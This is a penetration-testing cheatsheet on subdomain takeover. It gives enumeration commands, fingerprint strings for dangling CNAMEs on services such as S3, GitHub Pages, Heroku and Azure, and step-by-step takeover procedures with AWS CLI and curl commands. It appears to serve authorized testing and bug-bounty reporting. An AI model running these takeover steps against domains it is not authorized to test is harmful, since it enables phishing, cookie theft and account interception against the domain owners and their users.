# 🎯 Subdomain Takeover Cheatsheet

```
  ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗
  ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║
  ███████╗██║   ██║██████╔╝██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║
  ╚════██║██║   ██║██╔══██╗██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║
  ███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
  ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                ████████╗ █████╗ ██╗  ██╗███████╗ ██████╗ ██╗   ██╗███████╗██████╗ 
                ╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗
                   ██║   ███████║█████╔╝ █████╗  ██║   ██║██║   ██║█████╗  ██████╔╝
                   ██║   ██╔══██║██╔═██╗ ██╔══╝  ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
                   ██║   ██║  ██║██║  ██╗███████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║
                   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝
```

---

## 🎯 What is Subdomain Takeover

**Subdomain takeover** occurs when a subdomain points to a service (via CNAME) that has been removed, allowing an attacker to claim that service and serve malicious content.

### Impact
- 🔴 **Phishing** - Host convincing phishing pages
- 🔴 **Cookie Theft** - Steal cookies set on parent domain
- 🔴 **Account Takeover** - Intercept OAuth callbacks
- 🔴 **Reputation Damage** - Serve malicious content

---

## 🔍 Detection Methodology

### Step 1: Enumerate Subdomains
```bash
# Multiple tools for best coverage
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
assetfinder --subs-only target.com >> subs.txt

# Combine and dedupe
cat subs.txt amass.txt | sort -u > all_subs.txt
```

### Step 2: Find CNAMEs
```bash
# Check DNS records
cat all_subs.txt | while read sub; do
    cname=$(dig CNAME +short $sub)
    if [ ! -z "$cname" ]; then
        echo "$sub -> $cname"
    fi
done

# Or use dnsrecon
dnsrecon -d target.com -t crt
```

### Step 3: Check for Dangling CNAMEs
```bash
# Manual check
dig CNAME subdomain.target.com +short
# Returns: something.cloudfront.net
# Then check if that service is unclaimed

# httpx for status codes
cat all_subs.txt | httpx -status-code -title -tech-detect -no-color
```

---

## 🛠️ Automated Tools

### Subjack
```bash
# Install
go install github.com/haccer/subjack@latest

# Scan
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl

# With fingerprints
subjack -w subdomains.txt -t 100 -a -timeout 30 -o results.txt -ssl
```

### Nuclei (Takeover Templates)
```bash
# Using nuclei templates
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/ -o takeovers.txt

# Specific takeover checks
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/subdomain-takeover.yaml
```

### Can-I-Take-Over-XYZ
```bash
# Check the GitHub repo for fingerprints
# https://github.com/EdOverflow/can-i-take-over-xyz

# Use the fingerprints manually or with automated tools
```

---

## 📋 Vulnerable Services & Fingerprints

### AWS S3
```
CNAME: bucket.s3.amazonaws.com
CNAME: bucket.s3-website-region.amazonaws.com

Fingerprint: "NoSuchBucket"
Fingerprint: "The specified bucket does not exist"

Takeover: Create bucket with same name
```

### AWS CloudFront
```
CNAME: xxxxx.cloudfront.net

Fingerprint: "Bad Request"
Fingerprint: "ERROR: The request could not be satisfied"

Takeover: Create CloudFront distribution with same alternate domain
```

### GitHub Pages
```
CNAME: username.github.io
CNAME: organization.github.io

Fingerprint: "There isn't a GitHub Pages site here"

Takeover: 
1. Create repo username.github.io
2. Add CNAME file with target subdomain
```

### Heroku
```
CNAME: xxx.herokuapp.com
CNAME: xxx.herokudns.com

Fingerprint: "No such app"
Fingerprint: "There's nothing here, yet"

Takeover: Create Heroku app with same name
```

### Azure
```
CNAME: xxx.azurewebsites.net
CNAME: xxx.cloudapp.azure.com
CNAME: xxx.blob.core.windows.net

Fingerprint: "404 - Web Site not found"

Takeover: Create resource with same name
```

### Shopify
```
CNAME: shops.myshopify.com

Fingerprint: "Sorry, this shop is currently unavailable"
Fingerprint: "Only one step left"

Takeover: Create Shopify store and add custom domain
```

### WordPress.com
```
CNAME: xxx.wordpress.com

Fingerprint: "Do you want to register *.wordpress.com?"

Takeover: Register the subdomain on WordPress.com
```

### Zendesk
```
CNAME: xxx.zendesk.com

Fingerprint: "Help Center Closed"
Fingerprint: "This help center no longer exists"

Takeover: Not always possible - depends on Zendesk config
```

### Fastly
```
CNAME: xxx.fastly.net

Fingerprint: "Fastly error: unknown domain"

Takeover: Add domain to Fastly service
```

### Pantheon
```
CNAME: xxx.pantheonsite.io

Fingerprint: "The gods are wise but do not know of the site"
Fingerprint: "404 error unknown site!"

Takeover: Add site on Pantheon
```

---

## 🔥 Exploitation Steps

### Example: GitHub Pages Takeover

```bash
# 1. Find vulnerable subdomain
dig CNAME blog.target.com
# Returns: target.github.io (but repo doesn't exist)

# 2. Create GitHub repo
# Create: yourusername/target (or org/target)

# 3. Enable GitHub Pages in repo settings

# 4. Add CNAME file with content:
blog.target.com

# 5. Wait for DNS propagation

# 6. Verify takeover
curl https://blog.target.com
```

### Example: S3 Takeover

```bash
# 1. Confirm vulnerability
dig CNAME assets.target.com
# Returns: assets-target.s3.amazonaws.com

curl http://assets-target.s3.amazonaws.com
# Returns: NoSuchBucket

# 2. Create S3 bucket (same region)
aws s3 mb s3://assets-target --region us-east-1

# 3. Configure bucket
# Add website hosting or public access

# 4. Upload content
echo "Subdomain Takeover PoC" > index.html
aws s3 cp index.html s3://assets-target/

# 5. Verify
curl http://assets.target.com
```

---

## 📊 Quick Reference

### Vulnerable Service Detection

| Service | CNAME Pattern | Fingerprint |
|---------|---------------|-------------|
| AWS S3 | `*.s3.amazonaws.com` | NoSuchBucket |
| CloudFront | `*.cloudfront.net` | Bad Request |
| GitHub | `*.github.io` | No GitHub Pages |
| Heroku | `*.herokuapp.com` | No such app |
| Azure | `*.azurewebsites.net` | 404 Web Site not found |
| Shopify | `shops.myshopify.com` | Shop unavailable |

### Takeover Checklist

```markdown
- [ ] Enumerate all subdomains
- [ ] Identify CNAMEs
- [ ] Check for dangling records
- [ ] Match fingerprints
- [ ] Verify service is unclaimed
- [ ] Attempt takeover (ethically)
- [ ] Document and report
```

---

## 🛠️ Tools Summary

| Tool | Purpose |
|------|---------|
| **subjack** | Automated takeover detection |
| **nuclei** | Template-based scanning |
| **can-i-take-over-xyz** | Fingerprint reference |
| **dnsrecon** | DNS enumeration |
| **subfinder** | Subdomain discovery |
| **httpx** | HTTP probing |

---

## 📚 Resources

- [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Subjack](https://github.com/haccer/subjack)
- [Nuclei Takeover Templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/takeovers)

---

<p align="center">
  <b>🎯 Claim Those Subdomains!</b><br>
  <i>For authorized testing only!</i>
</p>
